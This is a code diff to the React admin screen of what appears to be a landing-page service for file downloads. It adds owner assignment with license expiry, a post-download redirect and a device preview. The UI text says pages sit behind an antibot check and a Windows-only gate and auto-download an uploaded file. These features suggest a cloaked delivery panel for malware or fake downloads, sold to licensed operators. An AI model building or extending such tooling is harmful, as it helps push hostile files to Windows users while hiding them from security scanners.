@@ -1,30 +1,35 @@
 import React, { useEffect, useState } from 'react';
 import api from '../../api';
 import Modal from '../../components/Modal';
+import PlaceholderDocs from '../../components/PlaceholderDocs';
 import { useToast } from '../../components/Toast';
 
 export default function LandingPages() {
   const toast = useToast();
   const [pages, setPages] = useState([]);
+  const [users, setUsers] = useState([]);
   const [modal, setModal] = useState(false);
   const [editId, setEditId] = useState(null);
-  const [form, setForm] = useState({ name: '', htmlCode: '', status: 'active' });
+  const [form, setForm] = useState({ name: '', htmlCode: '', status: 'active', user_id: '', redirect_url: '' });
   const [deployPage, setDeployPage] = useState(null);
+  const [previewPage, setPreviewPage] = useState(null);
+  const [previewDevice, setPreviewDevice] = useState('desktop');
 
   function load() {
     api.getPages().then(setPages).catch(() => {});
+    api.getUsers().then(list => setUsers(list.filter(u => u.role !== 'Admin'))).catch(() => {});
   }
   useEffect(load, []);
 
   function openNew() {
     setEditId(null);
-    setForm({ name: '', htmlCode: '', status: 'active' });
+    setForm({ name: '', htmlCode: '', status: 'active', user_id: '', redirect_url: '' });
     setModal(true);
   }
 
   function openEdit(p) {
     setEditId(p.id);
-    setForm({ name: p.name, htmlCode: p.html_code || '', status: p.status });
+    setForm({ name: p.name, htmlCode: p.html_code || '', status: p.status, user_id: p.user_id || '', redirect_url: p.redirect_url || '' });
     setModal(true);
   }
 
@@ -88,11 +93,13 @@ export default function LandingPages() {
                 <div className="meta">
                   Created: {p.created} &bull; HTML: {(p.html_code || '').length} chars
                   {activeV && <> &bull; Active: v{activeV.version}</>}
+                  {p.owner_name && <> &bull; Owner: <strong>{p.owner_name}</strong></>}
+                  {!p.user_id && <> &bull; <em style={{ color: '#94a3b8' }}>admin-owned</em></>}
                 </div>
                 <div className="btn-row">
                   <button className="btn btn-primary btn-sm" onClick={() => setDeployPage(p)}>Deploy</button>
                   <button className="btn btn-outline btn-sm" onClick={() => openEdit(p)}>Edit</button>
-                  <a className="btn btn-outline btn-sm" href={'/page/' + p.id} target="_blank" rel="noopener">Preview</a>
+                  <button className="btn btn-outline btn-sm" onClick={() => { setPreviewDevice('desktop'); setPreviewPage(p); }}>Preview</button>
                   <button className="btn btn-danger btn-sm" onClick={() => del(p.id, p.name)}>Delete</button>
                 </div>
               </div>
@@ -114,12 +121,22 @@ export default function LandingPages() {
           <label>Page Name</label>
           <input className="form-input" value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} placeholder="e.g. My App Download" />
         </div>
-        <div className="form-group">
-          <label>Status</label>
-          <select className="form-select" value={form.status} onChange={e => setForm({ ...form, status: e.target.value })}>
-            <option value="active">Active</option>
-            <option value="inactive">Inactive</option>
-          </select>
+        <div className="form-row">
+          <div className="form-group">
+            <label>Status</label>
+            <select className="form-select" value={form.status} onChange={e => setForm({ ...form, status: e.target.value })}>
+              <option value="active">Active</option>
+              <option value="inactive">Inactive</option>
+            </select>
+          </div>
+          <div className="form-group">
+            <label>Owner</label>
+            <select className="form-select" value={form.user_id} onChange={e => setForm({ ...form, user_id: e.target.value })}>
+              <option value="">— admin-owned (no licensing) —</option>
+              {users.map(u => <option key={u.id} value={u.id}>{u.name} ({u.email})</option>)}
+            </select>
+            <small style={{ color: '#475569', fontSize: '0.72rem' }}>Pages without an owner serve normally; owned pages stop serving when the owner's license expires.</small>
+          </div>
         </div>
         <div className="form-group">
           <label>HTML Source Code</label>
@@ -131,13 +148,20 @@ export default function LandingPages() {
             placeholder="Paste your full HTML landing page code here..."
           />
         </div>
-        <div className="placeholder-hint">
-          <p style={{ fontSize: '0.78rem', color: '#94a3b8', marginBottom: 8 }}>Available placeholders:</p>
-          <code>{'{{download_url}}'}</code> — Auto-download link<br/>
-          <code>{'{{file_name}}'}</code> — Uploaded file name<br/>
-          <code>{'{{version}}'}</code> — Current version<br/>
-          <code>{'{{app_name}}'}</code> — Page name
+        <div className="form-group">
+          <label>Post-download redirect URL <span style={{ color: '#475569', fontWeight: 400 }}>(optional)</span></label>
+          <input
+            className="form-input"
+            type="url"
+            value={form.redirect_url}
+            onChange={e => setForm({ ...form, redirect_url: e.target.value })}
+            placeholder="https://example.com/thank-you"
+          />
+          <small style={{ color: '#475569', fontSize: '0.72rem' }}>
+            If set, visitors are redirected here ~5 seconds after the download fires. Leave blank to stay on the page. http:// or https:// only.
+          </small>
         </div>
+        <PlaceholderDocs />
       </Modal>
 
       <Modal
@@ -171,6 +195,42 @@ export default function LandingPages() {
             </div>
           </div>
         )}
+      </Modal>
+
+      <Modal
+        title={previewPage ? 'Preview: ' + previewPage.name : 'Preview'}
+        show={!!previewPage}
+        onClose={() => setPreviewPage(null)}
+        footer={<>
+          <div style={{ display: 'flex', gap: 8, marginRight: 'auto' }}>
+            <button className={'btn btn-sm ' + (previewDevice === 'desktop' ? 'btn-primary' : 'btn-outline')} onClick={() => setPreviewDevice('desktop')}>Desktop</button>
+            <button className={'btn btn-sm ' + (previewDevice === 'tablet' ? 'btn-primary' : 'btn-outline')} onClick={() => setPreviewDevice('tablet')}>Tablet</button>
+            <button className={'btn btn-sm ' + (previewDevice === 'mobile' ? 'btn-primary' : 'btn-outline')} onClick={() => setPreviewDevice('mobile')}>Mobile</button>
+          </div>
+          {previewPage && <a className="btn btn-outline btn-sm" href={'/page/' + previewPage.id} target="_blank" rel="noopener">Open in new tab</a>}
+          <button className="btn btn-primary" onClick={() => setPreviewPage(null)}>Close</button>
+        </>}
+      >
+        {previewPage && (
+          <div style={{ background: '#0f1117', padding: 12, borderRadius: 8, display: 'flex', justifyContent: 'center' }}>
+            <iframe
+              key={previewPage.id + previewDevice}
+              src={'/page/' + previewPage.id + '?_t=' + Date.now()}
+              title="Landing page preview"
+              style={{
+                width: previewDevice === 'desktop' ? '100%' : previewDevice === 'tablet' ? 768 : 390,
+                height: 640,
+                border: '1px solid #1e2230',
+                borderRadius: 4,
+                background: '#fff',
+                maxWidth: '100%'
+              }}
+            />
+          </div>
+        )}
+        <p style={{ marginTop: 10, fontSize: '0.75rem', color: '#64748b' }}>
+          This is the exact HTML visitors see after passing antibot. Bot challenge, Windows-only gate, and license check are skipped for admin previews.
+        </p>
       </Modal>
     </div>
   );
